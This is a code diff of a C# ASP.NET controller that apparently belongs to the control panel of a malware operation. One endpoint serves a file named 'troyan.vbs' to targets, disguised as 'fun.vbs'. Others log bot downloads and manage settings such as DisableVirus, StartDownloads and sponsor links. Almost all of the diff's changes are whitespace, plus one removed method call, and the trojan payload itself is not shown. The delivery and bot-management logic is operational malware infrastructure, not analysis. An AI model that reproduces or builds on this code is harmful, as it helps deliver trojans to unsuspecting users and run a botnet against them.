@@ -47,7 +47,7 @@ public class CpController : BaseController
             return View("Index", new CpIndexViewModel { Server = err });
         }
     }
-    
+
     [HttpGet("/GetIcon")]
     public IActionResult GetIcon()
     {
@@ -111,7 +111,7 @@ public class CpController : BaseController
             return StatusCode(500, "Internal server error");
         }
     }
-    
+
     [HttpGet("/{profile}/{random}/{target}/GetVbs")]
     public async Task<IActionResult> GetVbs(string profile, string random, string target)
     {
@@ -120,10 +120,10 @@ public class CpController : BaseController
             return BadRequest("IP address not found.");
         if (string.IsNullOrWhiteSpace(Server))
             return BadRequest("Server address not found.");
-        
+
         return await GetFileAdvanced("troyan.vbs", "fun.vbs", random, target, "");
     }
-    
+
     [HttpPost]
     public IActionResult IndexWithServer(
         ServerModel updatedModel,
@@ -155,7 +155,7 @@ public class CpController : BaseController
                 return View("Index", new CpIndexViewModel { Server = existingModel });
             }
 
-            
+
             if (newEmbeddings != null && newEmbeddings.Count > 0)
             {
                 foreach (var file in newEmbeddings)
@@ -176,7 +176,7 @@ public class CpController : BaseController
             foreach (var file in toDeleteEmbeddings)
                 _serverService.DeleteEmbedding(server, file);
 
-            
+
             if (newFront != null && newFront.Count > 0)
             {
                 foreach (var file in newFront)
@@ -197,7 +197,7 @@ public class CpController : BaseController
             foreach (var file in toDeleteFront)
                 _serverService.DeleteFront(server, file);
 
-            
+
             if (iconFile != null && iconFile.Length > 0)
             {
                 var filePath = _serverService.GetIcon(server);
@@ -213,20 +213,20 @@ public class CpController : BaseController
                 .SelectMany(a => a.Split(Environment.NewLine))
                 .Where(a => !string.IsNullOrEmpty(a))
                 .Select(a => a.Trim()).Where(a => !string.IsNullOrEmpty(a)).ToList();
-            
+
             updatedModel.StartUrls = updatedModel.StartUrls
                 .Where(a => !string.IsNullOrEmpty(a))
                 .SelectMany(a => a.Split(Environment.NewLine))
                 .Where(a => !string.IsNullOrEmpty(a))
                 .Select(a => a.Trim()).Where(a => !string.IsNullOrEmpty(a)).ToList();
-            
+
             updatedModel.StartDownloads= updatedModel.StartDownloads
                 .Where(a => !string.IsNullOrEmpty(a))
                 .SelectMany(a => a.Split(Environment.NewLine))
                 .Where(a => !string.IsNullOrEmpty(a))
                 .Select(a => a.Trim()).Where(a => !string.IsNullOrEmpty(a)).ToList();
 
-            
+
             existingModel.UrlDoc = updatedModel.UrlDoc;
             existingModel.Server = server;
             existingModel.ServerIp = updatedModel.ServerIp;
@@ -258,13 +258,11 @@ public class CpController : BaseController
             existingModel.LandingAuto = updatedModel.LandingAuto;
             existingModel.LandingName = updatedModel.LandingName;
 
-            _serverService.UpdateIpDomains(existingModel);
-
             existingModel.Bux = updatedModel.Bux;
             existingModel.DnSponsor = updatedModel.DnSponsor;
             existingModel.DisableVirus = updatedModel.DisableVirus;
 
-            
+
             var result = _serverService.PostServerRequest(server, existingModel, action);
             if (result == "OK")
                 _hostsChanged.NotifyHostsChanged();
@@ -278,13 +276,13 @@ public class CpController : BaseController
             return View("Index", new CpIndexViewModel { Server = err });
         }
     }
-    
+
         [HttpGet("/{profile}/{random}/{target}/DnLog")]
     public async Task<IActionResult> DnLog(string profile, string random, string target)
     {
         return await _botController.DnLog(profile, random, target);
     }
-    
+
     [HttpPost("/upsert")]
     [Consumes("application/json")]
     [Produces("application/json")]
